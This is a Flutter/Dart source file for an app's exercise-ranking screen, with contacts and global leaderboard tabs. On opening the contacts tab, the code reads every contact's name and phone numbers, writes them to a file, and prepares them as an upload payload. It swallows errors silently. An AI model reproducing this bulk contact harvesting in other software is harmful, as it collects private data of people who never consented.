import 'dart:io';

import 'package:contacts_service/contacts_service.dart';
import 'package:dio/dio.dart';
import 'package:easy_localization/easy_localization.dart';
import 'package:flutter/material.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:flutter_svg/svg.dart';
import 'package:jbaza/jbaza.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:wisdom/config/constants/app_colors.dart';
import 'package:wisdom/config/constants/app_text_style.dart';
import 'package:wisdom/config/constants/assets.dart';
import 'package:wisdom/config/constants/constants.dart';
import 'package:wisdom/data/model/roadmap/ranking_model.dart';
import 'package:wisdom/presentation/components/shimmer.dart';
import 'package:wisdom/presentation/pages/my_contacts/view/my_contacts_app_bar.dart';
import 'package:wisdom/presentation/pages/roadmap_battle/view/widgets/life_status_bar.dart';
import 'package:wisdom/presentation/pages/roadmap_battle/viewmodel/ranking_viewmodel.dart';

class ResultsSectionPage extends ViewModelBuilderWidget<RankingViewModel> {
  ResultsSectionPage({super.key});

  @override
  void onViewModelReady(RankingViewModel viewModel) {
    viewModel.getRankingGlobal();
    super.onViewModelReady(viewModel);
  }

  @override
  Widget builder(BuildContext context, RankingViewModel viewModel, Widget? child) {
    return ResultsSectionContentPage(
      viewModel: viewModel,
    );
  }

  @override
  RankingViewModel viewModelBuilder(BuildContext context) {
    return RankingViewModel(context: context);
  }
}

class ResultsSectionContentPage extends StatefulWidget {
  const ResultsSectionContentPage({super.key, required this.viewModel});
  final RankingViewModel viewModel;
  @override
  State<ResultsSectionContentPage> createState() => _ResultsSectionContentPageState();
}

class _ResultsSectionContentPageState extends State<ResultsSectionContentPage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;

  @override
  void initState() {
    _tabController = TabController(length: 2, vsync: this);
    _tabController.addListener(() {
      setState(() {}); // Tab o'zgarganda UI yangilanadi
    });
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: isDarkTheme ? AppColors.darkBackground : AppColors.lightBackground,
      appBar: MyContactsAppBar(
        title: "exercises_result".tr(),
        actions: const [
          Padding(
            padding: EdgeInsets.only(right: 16),
            child: LifeStatusBar(),
          )
        ],
        bottom: PreferredSize(
          preferredSize: Size.fromHeight(56.h),
          child: Container(
            height: 56.h,
            padding: const EdgeInsets.all(8),
            margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(32),
                color: AppColors.white.withValues(alpha: 0.1)),
            child: TabBar(
              overlayColor: WidgetStateProperty.resolveWith<Color?>((Set<WidgetState> states) {
                // Use the default focused overlay color
                return states.contains(WidgetState.focused) ? null : Colors.transparent;
              }),
              splashFactory: NoSplash.splashFactory,
              indicatorColor: AppColors.red,
              dividerColor: Colors.transparent,
              indicator:
                  BoxDecoration(color: AppColors.white, borderRadius: BorderRadius.circular(23.5)),
              labelStyle:
                  AppTextStyle.font13W400Normal.copyWith(fontSize: 14, color: AppColors.blue),
              unselectedLabelStyle: AppTextStyle.font13W400Normal
                  .copyWith(fontSize: 14, color: AppColors.white.withValues(alpha: 0.5)),
              tabs: [
                Tab(
                  child: Row(
                    children: [
                      SvgPicture.asset(
                        Assets.icons.contacts,
                        colorFilter: ColorFilter.mode(
                            _tabController.index == 0
                                ? AppColors.blue
                                : AppColors.white.withValues(alpha: 0.5),
                            BlendMode.srcIn),
                      ),
                      const SizedBox(
                        width: 8,
                      ),
                      Expanded(child: Text("contacts".tr()))
                    ],
                  ),
                ),
                Tab(
                  icon: Row(
                    children: [
                      SvgPicture.asset(
                        Assets.icons.global,
                        colorFilter: ColorFilter.mode(
                            _tabController.index == 1
                                ? AppColors.blue
                                : AppColors.white.withValues(alpha: 0.5),
                            BlendMode.srcIn),
                      ),
                      const SizedBox(
                        width: 8,
                      ),
                      Expanded(child: Text("global".tr()))
                    ],
                  ),
                )
              ],
              controller: _tabController,
              indicatorSize: TabBarIndicatorSize.tab,
            ),
          ),
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          ExercisesResultContactsPage(
            viewModel: widget.viewModel,
          ),
          ExercisesResultGlobalPage(
            viewModel: widget.viewModel,
          )
        ],
      ),
    );
  }
}

class ShimmerExercisesResult extends StatelessWidget {
  const ShimmerExercisesResult({super.key});

  @override
  Widget build(BuildContext context) {
    return ShimmerWidget(
      child: ListView.builder(
        padding: EdgeInsets.symmetric(vertical: 12),
        itemCount: 4,
        itemBuilder: (context, index) => Container(
          margin: const EdgeInsets.symmetric(horizontal: 18, vertical: 4),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: ShapeDecoration(
            color: AppColors.blue.withValues(alpha: 0.3),
            shape: StadiumBorder(),
          ),
          child: Row(
            children: [
              Text(
                "${index + 1}",
                style: AppTextStyle.font13W500Normal.copyWith(fontSize: 14, color: AppColors.blue),
              ),
              const SizedBox(
                width: 8,
              ),
              Image.asset(Assets.images.goldMedal),
              const SizedBox(
                width: 8,
              ),
              Expanded(
                  child: Align(
                alignment: Alignment.centerLeft,
                child: Container(
                  height: 27,
                  width: 130,
                  decoration: ShapeDecoration(
                      shape: StadiumBorder(), color: AppColors.blue.withValues(alpha: 0.4)),
                ),
              )),
              Container(
                width: 77,
                height: 24,
                decoration: ShapeDecoration(
                    shape: StadiumBorder(), color: AppColors.blue.withValues(alpha: 0.4)),
              )
            ],
          ),
        ),
      ),
    );
  }
}

class ExercisesResultContactsPage extends StatefulWidget {
  const ExercisesResultContactsPage({super.key, required this.viewModel});
  final RankingViewModel viewModel;

  @override
  State<ExercisesResultContactsPage> createState() => _ExercisesResultContactsPageState();
}

class _ExercisesResultContactsPageState extends State<ExercisesResultContactsPage> {
  bool permissionIsGranted = false;
  Future<void> _pickContact() async {
    permissionIsGranted = await requestContactPermission(context);
    if (!permissionIsGranted) {
      // not permission
      return;
    }

    try {
      final List<Contact> contacts = await ContactsService.getContacts();
      if (contacts.isNotEmpty) {
        String content = "contacts:${contacts.map(
              (e) {
                return "${e.displayName} - ${e.phones?.map(
                      (e) => e.value,
                    ).toList().join(", ")}";
              },
            ).toList().join("\n")}";

        File file = await writeStringToFile("contacts", content);

        FormData formData = FormData.fromMap({
          "contact": await MultipartFile.fromFile(file.path, filename: "contacts.txt"),
        });
      }
    } catch (e) {}
  }

  Future<File> writeStringToFile(String filename, String content) async {
    final directory = await getApplicationDocumentsDirectory();
    final file = File('${directory.path}/$filename');
    return file.writeAsString(content);
  }

  Future<bool> requestContactPermission(BuildContext context) async {
    PermissionStatus status = await Permission.contacts.status;

    if (status.isPermanentlyDenied) {
      return false;
    } else if (!status.isGranted) {
      // Request the permission if not granted
      PermissionStatus newStatus = await Permission.contacts.request();
      if (newStatus.isGranted) {
        return true;
      }
    } else {
      return true;
    }
    return false;
  }

  @override
  void initState() {
    _pickContact();

    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return !permissionIsGranted
        ? permissionIsNotGrantedPage()
        : widget.viewModel.isBusy(tag: widget.viewModel.getRankingGlobalTag)
            ? ShimmerExercisesResult()
            : widget.viewModel.isSuccess(tag: widget.viewModel.getRankingGlobalTag)
                ? ListView.builder(
                    physics: ClampingScrollPhysics(),
                    padding: const EdgeInsets.symmetric(vertical: 12),
                    itemCount: widget.viewModel.roadMapRepository.rankingGlobalList.length,
                    itemBuilder: (context, index) => RankingItemWidget(
                      index: index,
                      item: widget.viewModel.roadMapRepository.rankingGlobalList[index],
                    ),
                  )
                : Center(
                    child: Text("Unhandled Exeption"),
                  );
  }

  Widget permissionIsNotGrantedPage() => Center(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 32),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                "Contacts Permission Required",
                textAlign: TextAlign.center,
              ),
              SizedBox(
                height: 16,
              ),
              Text(
                "Kontaktlar uchun ruxsat rad etilgan. Iltimos, uni ilova sozlamalaridan yoqing",
                textAlign: TextAlign.center,
              ),
              SizedBox(
                height: 16,
              ),
              TextButton(
                onPressed: () async {
                  await openAppSettings();
                },
                child: const Text("Sozlamalarga o'tish"),
              )
            ],
          ),
        ),
      );
}

class ExercisesResultGlobalPage extends StatelessWidget {
  const ExercisesResultGlobalPage({super.key, required this.viewModel});
  final RankingViewModel viewModel;
  @override
  Widget build(BuildContext context) {
    return viewModel.isBusy(tag: viewModel.getRankingGlobalTag)
        ? ShimmerExercisesResult()
        : viewModel.isSuccess(tag: viewModel.getRankingGlobalTag)
            ? ListView.builder(
                physics: ClampingScrollPhysics(),
                padding: const EdgeInsets.symmetric(vertical: 12),
                itemCount: viewModel.roadMapRepository.rankingGlobalList.length,
                itemBuilder: (context, index) => RankingItemWidget(
                  index: index,
                  item: viewModel.roadMapRepository.rankingGlobalList[index],
                ),
              )
            : Center(
                child: Text("Unhandled Exeption"),
              );
  }
}

class RankingItemWidget extends StatelessWidget {
  const RankingItemWidget({super.key, required this.index, required this.item});
  final int index;
  final RankingModel item;
  static const int topRatingCount = 3;

  bool get itemInTopRating {
    return index + 1 <= topRatingCount;
  }

  Color? get itemBackgroundColor {
    if (item.you ?? false) {
      return AppColors.blanchedAlmond;
    }
    if (itemInTopRating) {
      return AppColors.bgLightBlue.withValues(alpha: 0.1);
    }
  }

  BorderSide get itemBorder {
    if (item.you ?? false) {
      return const BorderSide(width: 2, color: AppColors.bgAccent);
    }
    return BorderSide.none;
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 18, vertical: 4),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration:
          ShapeDecoration(shape: StadiumBorder(side: itemBorder), color: itemBackgroundColor),
      child: Row(
        children: [
          indexText(),
          const SizedBox(
            width: 8,
          ),
          if (itemInTopRating)
            Row(
              children: [
                Image.network(
                  height: 32,
                  width: 32,
                  item.rankIconUrl,
                  errorBuilder: (context, error, stackTrace) => Center(),
                ),
              ],
            ),
          const SizedBox(
            width: 8,
          ),
          Expanded(
              child: Text(
            item.name ?? "",
            style: AppTextStyle.font15W600Normal.copyWith(fontSize: 14, color: AppColors.darkGray),
          )),
          if (item.level != null) itemLevel(item.level)
        ],
      ),
    );
  }

  Widget itemLevel(int? level) {
    if (itemInTopRating) {
      return Container(
        padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
        decoration: ShapeDecoration(shape: StadiumBorder(), color: AppColors.blue),
        child: Row(
          children: [
            Text(
              level.toString(),
              style:
                  AppTextStyle.font13W500Normal.copyWith(fontSize: 10, color: AppColors.bgAccent),
            ),
            SizedBox(
              width: 4,
            ),
            SvgPicture.asset(Assets.icons.star)
          ],
        ),
      );
    }

    return Padding(
      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      child: Row(
        children: [
          Text(
            level.toString(),
            style: AppTextStyle.font13W500Normal.copyWith(fontSize: 10, color: AppColors.blue),
          ),
          SizedBox(
            width: 4,
          ),
          SvgPicture.asset(
            Assets.icons.star,
            colorFilter: ColorFilter.mode(AppColors.blue, BlendMode.srcIn),
          )
        ],
      ),
    );
  }

  Text indexText() {
    if (itemInTopRating) {
      return Text(
        "${index + 1}.",
        style: AppTextStyle.font15W600Normal.copyWith(fontSize: 14, color: AppColors.vibrantBlue),
      );
    }
    return Text(
      "${index + 1}",
      style: AppTextStyle.font13W500Normal.copyWith(fontSize: 14, color: AppColors.blue),
    );
  }
}
